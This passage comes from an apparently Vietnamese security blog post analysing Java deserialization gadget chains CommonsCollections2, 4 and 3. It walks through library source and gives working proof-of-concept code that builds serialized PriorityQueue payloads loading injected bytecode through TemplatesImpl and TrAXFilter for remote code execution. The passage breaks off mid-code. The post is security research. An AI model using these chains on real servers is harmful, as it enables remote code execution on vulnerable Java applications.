<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> O <span style="color:#a6e22e">transform</span>(Object input) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (input <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            Class<span style="color:#f92672">&lt;?&gt;</span> cls <span style="color:#f92672">=</span> input.<span style="color:#a6e22e">getClass</span>();
</span></span><span style="display:flex;"><span>            Method method <span style="color:#f92672">=</span> cls.<span style="color:#a6e22e">getMethod</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iMethodName</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iParamTypes</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> method.<span style="color:#a6e22e">invoke</span>(input, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iArgs</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var4) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// truncated</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Constructor:
<img src="/images/2023/Java-deserialization-p1/Constructor.png" alt="Constructor"></p>
<p>Do đó ta có thể invoke luôn <code>TemplatesImpl#newTransformer()</code> để load bytecode</p>
<h4 id="poc-1">PoC</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(evil.<span style="color:#a6e22e">EvilTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>()).<span style="color:#a6e22e">toBytecode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    InvokerTransformer invTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;newTransformer&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>    TransformingComparator transComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(invTransformer);
</span></span><span style="display:flex;"><span>    PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(transComparator);
</span></span><span style="display:flex;"><span>    setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;size&#34;</span>, 2);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl,tplsImpl});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String serialized <span style="color:#f92672">=</span> serTest(priorityQueue);
</span></span><span style="display:flex;"><span>    deserTest(serialized);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Note</strong>: Ở đây để tránh tự RCE máy chính mình khi dùng method <code>add()</code> như chain CommonsBeanutils1 trên, mình dùng reflection để set luôn <code>size=2</code> cho tiện.</p>
<p><img src="/images/2023/Java-deserialization-p1/popup3.png" alt="popup3"></p>
<h3 id="commonscollections4">CommonsCollections4</h3>
<p>Yêu cầu: <code>commons-collections4==4.0</code></p>
<p><strong>Full chain</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue.<span style="color:#a6e22e">readObject</span>()                            <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>    PriorityQueue.<span style="color:#a6e22e">heapify</span>()                           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        PriorityQueue.<span style="color:#a6e22e">siftDown</span>()                      <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>            PriorityQueue.<span style="color:#a6e22e">siftDownUsingComparator</span>() __<span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                TransformingComparator.<span style="color:#a6e22e">compare</span>()
</span></span><span style="display:flex;"><span>                    ChainedTransformer.<span style="color:#a6e22e">transform</span>()
</span></span><span style="display:flex;"><span>                        ConstantTransformer.<span style="color:#a6e22e">transform</span>()
</span></span><span style="display:flex;"><span>                            InstantiateTransformer.<span style="color:#a6e22e">transform</span>()
</span></span><span style="display:flex;"><span>                                    TrAXFilter.<span style="color:#a6e22e">TrAXFilter</span>()
</span></span><span style="display:flex;"><span>                                      <span style="color:#f92672">--|</span>TemplatesImpl.<span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">|</span>TransletClassLoader.<span style="color:#a6e22e">defineClass</span>()
</span></span></code></pre></div><h4 id="traxfiltertraxfilter">TrAXFilter#TrAXFilter()</h4>
<p>Thư viện apache xalan trong java runtime có class <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> với constructor gọi đến <code>TemplatesImpl#newTransformer()</code>, điều kiện cần để load bytecode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TrAXFilter</span>(Templates templates)  <span style="color:#66d9ef">throws</span>
</span></span><span style="display:flex;"><span>    TransformerConfigurationException
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    _templates <span style="color:#f92672">=</span> templates;
</span></span><span style="display:flex;"><span>    _transformer <span style="color:#f92672">=</span> (TransformerImpl) templates.<span style="color:#a6e22e">newTransformer</span>();
</span></span><span style="display:flex;"><span>    _transformerHandler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerHandlerImpl(_transformer);
</span></span><span style="display:flex;"><span>    _overrideDefaultParser <span style="color:#f92672">=</span> _transformer.<span style="color:#a6e22e">overrideDefaultParser</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tuy nhiên class này không implements interface <code>Serializable</code>, điều kiện đủ 😬😬:
<img src="/images/2023/Java-deserialization-p1/noSerializable.png" alt="noSerializable"></p>
<p>Cùng xem các class trước đó làm được gì và làm cách nào để khởi tạo được class này khi deserialize?</p>
<h4 id="chainedtransformertransform">ChainedTransformer#transform()</h4>
<p>Như đã phân tích ở CC2, <code>TransformingComparator#compare()</code> gọi được đến <code>Object#transform()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(I obj1, I obj2) {
</span></span><span style="display:flex;"><span>    O value1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span>.<span style="color:#a6e22e">transform</span>(obj1);
</span></span><span style="display:flex;"><span>    O value2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">transformer</span>.<span style="color:#a6e22e">transform</span>(obj2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">decorated</span>.<span style="color:#a6e22e">compare</span>(value1, value2);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tuy nhiên khác với CC2, chain này không cần sử dụng <code>InvokerTransformer#transform()</code>, thay vào đó là <code>ChainedTransformer#transform()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> T <span style="color:#a6e22e">transform</span>(T object) {
</span></span><span style="display:flex;"><span>    Transformer<span style="color:#f92672">[]</span> arr$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iTransformers</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> len$ <span style="color:#f92672">=</span> arr$.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i$ <span style="color:#f92672">=</span> 0; i$ <span style="color:#f92672">&lt;</span> len$; <span style="color:#f92672">++</span>i$) {
</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">super</span> T, <span style="color:#f92672">?</span> <span style="color:#66d9ef">extends</span> T<span style="color:#f92672">&gt;</span> iTransformer <span style="color:#f92672">=</span> arr$<span style="color:#f92672">[</span>i$<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>        object <span style="color:#f92672">=</span> iTransformer.<span style="color:#a6e22e">transform</span>(object);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> object;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Method lấy một array interface <code>Transformer[]</code> từ field <code>iTransformers</code>, interface <code>Transformer</code>:
<img src="/images/2023/Java-deserialization-p1/Transformer.png" alt="Transformer">
=&gt; array này chỉ chứa các objects implements interface <code>Transformer</code></li>
<li>Lặp và lấy từng <code>iTransformer</code> trong array này</li>
<li>Mỗi lần lặp sẽ gọi method <code>transform()</code> của object <code>iTransformer</code> tương ứng với mà argument <code>object</code> là kết quả của vòng lặp trước đó, riêng vòng lặp đầu tiên <code>object</code> là giá trị ban đầu được pass vào <code>ChainedTransformer#transform()</code>.</li>
</ul>
<p>==&gt; <strong>Ý tưởng</strong>: Tìm các class có method <code>transform()</code> và implements interface <code>Transform</code> mà kết quả <code>transform()</code> trả về:</p>
<ul>
<li>Class thứ nhất trả về class muốn khởi tạo: <code>TrAXFilter</code></li>
<li>Class thứ hai khởi tạo class object này: ex <code>TrAXFilter.newInstance()</code></li>
</ul>
<h4 id="constanttransformertransform">ConstantTransformer#transform()</h4>
<p><code>ConstantTransformer</code> có method <code>transform()</code> trả về field <code>iConstant</code>, để ý argument <code>input</code> chẳng để làm gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> O <span style="color:#a6e22e">transform</span>(I input) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iConstant</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Field <code>iConstant</code> có object type là generic =&gt; gán được object bất kỳ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> O iConstant;
</span></span></code></pre></div><p>Dễ dàng gán <code>iConstant</code> qua constructor của class:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ConstantTransformer</span>(O constantToReturn) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iConstant</span> <span style="color:#f92672">=</span> constantToReturn;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="instantiatetransformertransform">InstantiateTransformer#transform()</h4>
<p>Method này sẽ khởi tạo class object từ argument <code>input</code> với <code>iParamTypes</code> và <code>iArgs</code> lần lượt là parameters type và arguments của constructor trong class đó</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> T <span style="color:#a6e22e">transform</span>(Class<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">extends</span> T<span style="color:#f92672">&gt;</span> input) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (input <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException(<span style="color:#e6db74">&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a null object&#34;</span>);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                Constructor<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">extends</span> T<span style="color:#f92672">&gt;</span> con <span style="color:#f92672">=</span> input.<span style="color:#a6e22e">getConstructor</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iParamTypes</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> con.<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iArgs</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var3) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// truncated ...</span>
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Constructor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">InstantiateTransformer</span>(Class<span style="color:#f92672">&lt;?&gt;[]</span> paramTypes, Object<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iParamTypes</span> <span style="color:#f92672">=</span> paramTypes <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> (Class<span style="color:#f92672">[]</span>)paramTypes.<span style="color:#a6e22e">clone</span>() : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">iArgs</span> <span style="color:#f92672">=</span> args <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> (Object<span style="color:#f92672">[]</span>)args.<span style="color:#a6e22e">clone</span>() : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vậy là đã đủ 2 class mà <code>ChainedTransformer#transform()</code> mong muốn:</p>
<ul>
<li>lặp 1 <code>ConstantTransformer#transform(1)</code> sẽ trả về <code>TrAXFilter.class</code></li>
<li>lặp 2 <code>InstantiateTransformer#transform(TrAXFilter.class)</code> gọi <code>TrAXFilter.newInstance()</code>
<img src="/images/2023/Java-deserialization-p1/CC4diagram.png" alt="CC4diagram"></li>
</ul>
<h4 id="traxfilterclass">TrAXFilter.class</h4>
<p>Như đã trình bày do class <code>TrAXFilter</code> không implements <code>Serializable</code> nên không thể sử dụng khi build chain. Tuy nhiên có thể dùng <code>TrAXFilter.class</code> là vì <code>TrAXFilter.class</code> object trả về <code>java.lang.Class</code> cái implements <code>Serializable</code>.</p>
<p><code>TrAXFilter.class</code> dù không phải là <code>TrAXFilter</code> object nhưng là <code>Class</code> object chứa các thông tin metadata về class <code>TrAXFilter</code> như <code>name</code>, <code>package</code>, <code>methods</code>, <code>fields</code>,&hellip; mà có thể sử dụng để khởi tạo object trong java reflection. (<a href="https://stackoverflow.com/questions/4453349/what-is-the-class-object-java-lang-class">here</a>)</p>
<h4 id="poc-2">PoC</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(evil.<span style="color:#a6e22e">EvilTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>()).<span style="color:#a6e22e">toBytecode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ConstantTransformer constTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>); <span style="color:#75715e">// loop 1 trả về TrAXFilter.class</span>
</span></span><span style="display:flex;"><span>    InstantiateTransformer insTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{javax.<span style="color:#a6e22e">xml</span>.<span style="color:#a6e22e">transform</span>.<span style="color:#a6e22e">Templates</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl}); <span style="color:#75715e">// loop 2 gọi class TrAXFilter constructor</span>
</span></span><span style="display:flex;"><span>    ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
</span></span><span style="display:flex;"><span>            constTransformer, insTransformer
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>    TransformingComparator transComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(chainedTransformer);
</span></span><span style="display:flex;"><span>    PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(transComparator);
</span></span><span style="display:flex;"><span>    setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;size&#34;</span>, 2);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{1,1});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String serialized <span style="color:#f92672">=</span> serTest(priorityQueue);
</span></span><span style="display:flex;"><span>    deserTest(serialized);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/popup4.png" alt="popup4"></p>
<h3 id="commonscollections3">CommonsCollections3</h3>
<p><strong>Yêu cầu</strong>: <code>3.1</code> &lt;= <code>commons-collections</code> &lt;= <code>3.2.1</code> &amp;&amp; <code>jdk7</code> || <code>jdk8</code> &lt; <code>8u71</code> (khá cũ)</p>
<p>Bài viết dùng: <code>commons-collections 3.1</code>, <code>jdk8u66</code></p>
<p>Chain này khá giống CC4, khác mỗi phần source gọi đến <code>ChainedTransformer#transform()</code> do class <code>TransformingComparator</code> tại version này chưa implements <code>Serializable</code> nên không thể sử dụng</p>
<p><strong>Full chain</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>AnnotationInvocationHandler.<span style="color:#a6e22e">readObject</span>()
</span></span><span style="display:flex;"><span>    Map(Proxy).<span style="color:#a6e22e">entrySet</span>()
</span></span><span style="display:flex;"><span>        AnnotationInvocationHandler.<span style="color:#a6e22e">invoke</span>()
</span></span><span style="display:flex;"><span>            LazyMap.<span style="color:#a6e22e">get</span>()
</span></span><span style="display:flex;"><span>                ChainedTransformer.<span style="color:#a6e22e">transform</span>()              <span style="color:#f92672">--|</span>
</span></span><span style="display:flex;"><span>                    ConstantTransformer.<span style="color:#a6e22e">transform</span>()           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                        InstantiateTransformer.<span style="color:#a6e22e">transform</span>()    <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                            TrAXFilter.<span style="color:#a6e22e">TrAXFilter</span>()           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#f92672">--|</span>TemplatesImpl.<span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">|</span>TemplatesImpl.<span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">|</span>TransletClassLoader.<span style="color:#a6e22e">defineClass</span>()
</span></span></code></pre></div><h4 id="lazymapget--annotationinvocationhandlerinvoke">LazyMap#get() &amp;&amp; AnnotationInvocationHandler#invoke()</h4>
<p><code>org.apache.commons.collections.map.LazyMap#get()</code> gọi được <code>this.factory.transform()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">get</span>(Object key) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">containsKey</span>(key)) {
</span></span><span style="display:flex;"><span>        Object value <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">factory</span>.<span style="color:#a6e22e">transform</span>(key);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">put</span>(key, value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">get</span>(key);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Có thể set giá trị này qua static method là <code>LazyMap#decorate()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">decorate</span>(Map map, Transformer factory) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> LazyMap(map, factory);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">LazyMap</span>(Map map, Transformer factory) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>(map);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (factory <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Factory must not be null&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">factory</span> <span style="color:#f92672">=</span> factory;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>AnnotationInvocationHandler#invoke()</code> là method gọi đến <code>LazyMap#get()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">invoke</span>(Object var1, Method var2, Object<span style="color:#f92672">[]</span> var3) {
</span></span><span style="display:flex;"><span>    String var4 <span style="color:#f92672">=</span> var2.<span style="color:#a6e22e">getName</span>();
</span></span><span style="display:flex;"><span>    Class<span style="color:#f92672">[]</span> var5 <span style="color:#f92672">=</span> var2.<span style="color:#a6e22e">getParameterTypes</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (var4.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;equals&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> var5.<span style="color:#a6e22e">length</span> <span style="color:#f92672">==</span> 1 <span style="color:#f92672">&amp;&amp;</span> var5<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> Object.<span style="color:#a6e22e">class</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">equalsImpl</span>(var3<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (var5.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!=</span> 0) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> AssertionError(<span style="color:#e6db74">&#34;Too many parameters for an annotation method&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (var4) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;toString&#34;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">toStringImpl</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;hashCode&#34;</span>:
